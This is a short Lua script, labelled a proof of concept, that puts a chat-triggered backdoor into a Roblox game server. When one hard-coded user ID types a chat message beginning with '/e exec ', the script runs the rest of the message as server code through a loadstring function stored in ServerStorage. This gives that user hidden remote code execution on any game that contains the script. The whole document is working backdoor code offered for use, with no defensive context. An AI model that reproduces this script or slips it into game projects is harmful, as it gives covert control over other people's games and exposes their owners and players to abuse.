--Proof of Concept: Roblox Command-Line Backdoor
local ServerStorage = game:GetService("ServerStorage")
local Players = game:GetService("Players")

local loadstring = ServerStorage:FindFirstChild("vLuau")

local AllowedPlayers = {
    1124961069
}

local function playerJoined(plr:Player)
    if table.find(AllowedPlayers, plr.UserId) then
        plr.Chatted:Connect(function(msg)
            if msg:sub(1, 8) == "/e exec " then
                local code = msg:sub(9)
                local success, err = pcall(function()
                    loadstring.Value(code)()
                end)
                if not success then
                    warn("Error: " .. err)
                end
            end
        end)
    end
end

Players.PlayerAdded:Connect(playerJoined)